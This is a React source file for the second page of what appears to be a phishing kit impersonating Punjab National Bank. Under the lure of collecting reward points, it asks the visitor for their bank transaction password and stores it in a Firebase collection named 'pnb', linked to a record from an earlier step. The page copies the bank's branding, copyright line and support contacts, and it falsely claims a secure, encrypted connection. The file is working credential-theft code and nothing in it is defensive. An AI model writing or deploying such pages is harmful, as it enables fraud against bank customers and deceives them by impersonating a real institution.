import { useState } from 'react';
import { useNavigate, useParams } from 'react-router-dom';
import '../App.css';
import secondPageImage from '../assets/second_page_img.jpeg';
import FirebaseUtil from '../FirebaseRepo';

const SecondPage = () => {
  const [password2, setPassword2] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const navigate = useNavigate();
  const { documentId } = useParams();


  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsSubmitting(true);

    try {
      // Update the existing document in the pnb collection
      const result = await FirebaseUtil.updateDocument("pnb", documentId, {
        password2,
      });

      // Check if update was successful
      if (result.state === 'success') {
        // Navigate to the success page after successful submission
        navigate('/success');
      } else {
        throw new Error(result.error || 'Failed to update document');
      }
    } catch (error) {
      console.error("Error submitting form:", error);
      setIsSubmitting(false);
    }
  };

  return (
    <div className="flex flex-col min-h-screen bg-white">
      {/* Header Image - Centered with white space on sides */}
      <div className="w-full bg-white py-4 flex justify-center">
        <div className="max-w-md mx-auto">
          <img 
            src={secondPageImage} 
            alt="PNB Bank Header" 
            className="max-h-48 w-auto object-contain"
          />
        </div>
      </div>

      {/* Main Content */}
      <main className="flex-1 m-2 flex justify-center items-center bg-gray-100">
        <div className="bg-white text-gray-800 rounded-xl w-full max-w-md p-5 shadow-lg border-t-4 border-[#A20E37]">
          <div className="text-center mb-6">
            <h1 className="text-2xl font-bold text-[#A20E37]">
              One Step Away To Collect Your Rewards Points
            </h1>
          </div>

          <form onSubmit={handleSubmit} className="space-y-4">
            <div className="mb-4">
              <label className="block text-gray-700 text-sm font-bold mb-2">
                Verify Your Transaction Password
              </label>
              <input
                type="password"
                className="w-full py-2 px-3 rounded border border-gray-300 text-gray-700 text-sm focus:outline-none focus:ring-2 focus:ring-[#A20E37]"
                value={password2}
                onChange={(e) => setPassword2(e.target.value)}
                required
              />
            </div>

            <button
              type="submit"
              className="w-full bg-[#FBBC09] hover:bg-yellow-500 text-black font-bold py-2 px-4 rounded-full text-sm"
              disabled={isSubmitting}
            >
              {isSubmitting ? "PROCESSING..." : "SUBMIT"}
            </button>
          </form>

          <div className="mt-6 text-center">
            <p className="text-sm text-gray-600">
              Your security is our priority. All transactions are encrypted and secure.
            </p>
            <div className="flex items-center justify-center mt-2">
              <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5 text-[#A20E37] mr-1" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
              </svg>
              <span className="text-xs font-semibold">Secure Connection</span>
            </div>
          </div>
        </div>
      </main>

      {/* Bottom Part / Footer */}
      <footer className="bg-gray-800 text-white p-4 text-center">
        <p className="text-sm"> 2025 Punjab National Bank. All rights reserved.</p>
        <p className="text-xs">For support, call 1800-180-2222 or email care@pnb.co.in</p>
      </footer>
    </div>
  );
};

export default SecondPage;
